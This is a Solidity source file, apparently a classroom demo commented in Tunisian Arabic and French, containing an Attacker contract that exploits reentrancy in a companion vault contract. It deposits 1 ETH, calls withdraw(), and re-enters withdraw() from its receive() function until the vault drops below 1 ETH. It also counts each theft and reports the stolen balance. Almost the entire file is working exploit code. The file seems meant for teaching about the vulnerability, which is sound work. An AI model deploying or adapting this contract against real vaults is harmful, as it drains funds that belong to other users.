// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// CONTRAT 2 : ATTAQUANT ( il sara9 )

interface IVault {

    // fontion ili bich ysoub biha il flous , payable bill ETH DE L'exterieur kima destributeur  

    function deposit() external payable;  

    // fonction ili bich t5arij il flous "retrait" mil exterieur kima bouton 
    // fonction non securisé 
  
    function withdraw() external; 

}

contract Attacker {

    // Référence au contrat vulnérable ( contract 1) 

    IVault public vault;
    
    // Compteur : 9ada min mara sra9 

    uint256 public stolenCount;
    
    // Événements suiver lattaque (historique )

    event AttackStarted();
    event MoneyStolen(uint256 amount);
    
    // Constructeur : reçoit l'adresse du vault ( l'address mta 5azna)

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }
    
    // lancer l'attaque - lazim sara9 yab3ith 1 ETH 

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to start attack");
        
        emit AttackStarted();
        
        // Étape 1 : Dépôt de 1 ETH dans le vault ( bich yajim yisra9 )

        vault.deposit{value: 1 ether}();
        
        // Étape 2 : déclenche la réentrance awil mayijbid flous w tab9a boucle t3ayit lil receive()

        vault.withdraw();
    }
    
    // FONCTION receive() - miftah il sir9a 

    // Cette fonction est appelée AUTOMATIQUEMENT quand le contrat reçoit des ETH

    receive() external payable {
        stolenCount++;
        
        emit MoneyStolen(msg.value);
        
    //  RÉENTRANCE : On rappelle withdraw() tant qu'il y a de l'argent
    // On vérifie que le vault a encore au moins 1 ETH

        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
    

    // Voir combien d'ETH on a volé stamaltha fil test ligne 42
    
    function getStolenBalance() public view returns (uint256) {
        return address(this).balance;
    }
}